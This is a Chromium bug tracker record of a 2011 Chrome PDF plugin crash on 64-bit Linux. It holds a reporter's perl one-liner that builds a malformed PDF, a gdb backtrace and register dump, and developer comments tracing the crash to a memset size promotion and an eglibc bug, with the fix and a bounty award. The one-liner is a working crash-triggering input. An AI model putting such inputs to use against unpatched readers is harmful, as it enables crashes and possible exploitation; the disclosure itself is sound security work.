# Crash on bad rip when opening a PDF

| Field | Value |
|-------|-------|
| **Issue ID** | [40093518](https://issues.chromium.org/issues/40093518) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | ao...@gmail.com |
| **Assignee** | [Deleted User] |
| **Created** | 2011-08-04 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

Opening the attached PDF document causes a crash at ip 0xffffffff. Many changes to the document cause the crash to be elsewhere, such as "segfault at 7fa508250e2c ip 00007fa52aa92380 sp 00007fff09328008 error 4 in libc-2.11.2.so" by changing the size in the document.

The original file crashed only in 64-bit Linux, but I haven't tried to reproduce on 32-bit actively. Not tested on other platforms.

**VERSION**  

Chrome Version: 13.0.782.109 beta  

Operating System: Linux, Debian 6.0.2 on x86\_64

**REPRODUCTION CASE**

1. $ perl -e 'print "%PDF-1.6\n", "a"x62343, "191 0 obj\n", "a"x245, "\nendobj\n", "192 0 obj <</<</", "</"x374, " >>/>>/ R/Size 19999999999999999999999999999999999999999/Type/XRef/W>>\nstream\n", "a"x24562, "\nstartxref\n 62616\n"' > ffffffff.pdf
2. $ google-chrome ffffffff.pdf
3. tab is sad

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:  

Program received signal SIGSEGV, Segmentation fault.  

0x00000000ffffffff in ?? ()  

(gdb) bt 10  

#0 0x00000000ffffffff in ?? ()  

#1 0x00007fffecd4fb2b in ?? () from /opt/google/chrome/libpdf.so  

#2 0x00007fffecd502a5 in ?? () from /opt/google/chrome/libpdf.so  

#3 0x00007fffecd520fe in ?? () from /opt/google/chrome/libpdf.so  

#4 0x00007fffecb695b5 in ?? () from /opt/google/chrome/libpdf.so  

#5 0x00007fffecb4fcc1 in ?? () from /opt/google/chrome/libpdf.so  

#6 0x00007fffecb50158 in ?? () from /opt/google/chrome/libpdf.so  

#7 0x00007fffecb35ef6 in ?? () from /opt/google/chrome/libpdf.so  

#8 0x00007fffecb3821d in ?? () from /opt/google/chrome/libpdf.so  

#9 0x00007fffecb35699 in ?? () from /opt/google/chrome/libpdf.so  

(More stack frames follow...)  

(gdb) x/i $rip  

0x7fffecd4fb2b: jmpq 0x7fffecd4f9f2  

(gdb) x/10i $rip-27  

0x7fffecd4fb10: mov $0xffffffff,%edx  

0x7fffecd4fb15: callq 0x7fffecbe0130  

0x7fffecd4fb1a: mov 0x1e0(%rbp),%rdi  

0x7fffecd4fb21: movslq %ebx,%rdx  

0x7fffecd4fb24: xor %esi,%esi  

0x7fffecd4fb26: callq 0x7fffecb32a58 [memset@plt](mailto:memset@plt)  

0x7fffecd4fb2b: jmpq 0x7fffecd4f9f2  

0x7fffecd4fb30: shr %eax  

0x7fffecd4fb32: mov %eax,0x40(%rsp)  

0x7fffecd4fb36: mov 0x28(%rsp),%rax  

(gdb) i r  

rax 0x0 0  

rbx 0xffffffff 4294967295  

rcx 0xfffffffffffffffe -2  

rdx 0x0 0  

rsi 0x0 0  

rdi 0xffffffffffffffff -1  

rbp 0x3cdfc80 0x3cdfc80  

rsp 0x7fffffffc560 0x7fffffffc560  

r8 0xffffffffffffffff -1  

r9 0x101010101010101 72340172838076673  

r10 0x6161616161616161 7016996765293437281  

r11 0x7ffff21c938a 140737255347082  

r12 0x7fffffffc6bc 140737488340668  

r13 0x1 1  

r14 0x7fffffffc750 140737488340816  

r15 0x3d092c0 64000704  

rip 0x7fffecd4fb2b 0x7fffecd4fb2b  

eflags 0x10286 [ PF SF IF RF ]  

cs 0x33 51  

ss 0x2b 43  

ds 0x0 0  

es 0x0 0  

fs 0x0 0  

gs 0x0 0  

fctrl 0x37f 895  

fstat 0x0 0  

ftag 0xffff 65535  

fiseg 0x0 0  

fioff 0x0 0  

foseg 0x0 0  

fooff 0x0 0  

fop 0x0 0  

mxcsr 0x1fa5 [ IE ZE PE IM DM ZM OM UM PM ]

## Attachments

- [ffffffff.pdf](attachments/ffffffff.pdf) (application/pdf; charset=us-ascii, 86.0 KB)

## Timeline

### sc...@gmail.com (2011-08-04)

Given the small size of the repro, I predict I can fix it today :)

### sc...@gmail.com (2011-08-04)

Well, isn't this just fascinating!

There's basically an int -> size_t promotion going on in an argument to memset(), so this may explain the 64-bit 

So it basically boils down to memset(NULL, 0, massive)

Case closed right? Well no, turns out that some serious issues were introduced into memcpy() with negative lengths:

https://twitter.com/#!/41414141/status/93031254223634432
http://www.nodefense.org/eglibc.txt

Looking briefly at the assembly for memset(), it also has some dynamic jump locations going on, so I expect this explains why you have crazy %rip resulting.

### sc...@gmail.com (2011-08-04)

Fixed in PDF r1079.
Thanks Aki. I'll merge to the M13 patch. Since buggy Ubuntu glibc makes this possibly exploitable, we'll see if it qualifies for a reward.

### ao...@gmail.com (2011-08-05)

Heh, I was going to have a look for exploitable cases of @41414141's bug in some video&audio decoding libraries on Ubuntu later, but hadn't thought of running into it in Chrome on Debian.

6 hours between issue being filed and fix landing. I think this is a new record :)

### sc...@gmail.com (2011-08-05)

I'm not sure it's @41414141's bug.... just a reference to someone else's bug.
BTW, most of those 6 hours were me waking up, driving in to work, and WTF'ing at memset(NULL) -> bad RIP

### sc...@gmail.com (2011-08-05)

Merged to M14 at r1082
Merged to M13 at r1083

### sc...@gmail.com (2011-08-16)

@aohelin: ok, so the report quality is excellent (generating a minimal PDF is hard!), and this ends up being actually exploitable (thanks eglibc grrrrr), so a reward is fair game. $1000.

### sc...@gmail.com (2011-08-16)

[Empty comment from Monorail migration]

### ao...@gmail.com (2011-08-16)

Excellent! Also fun to have stumbled into the eglibc bug via a browser. Nice doing business with you again :)

### sc...@gmail.com (2011-08-24)

Payment in system...

### sc...@gmail.com (2011-09-23)

CVE was typo'ed in the release notes, so changing here to match.

### js...@chromium.org (2011-10-05)

Batch update.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed.. 

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-11)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-26)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/91665?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40093518)*
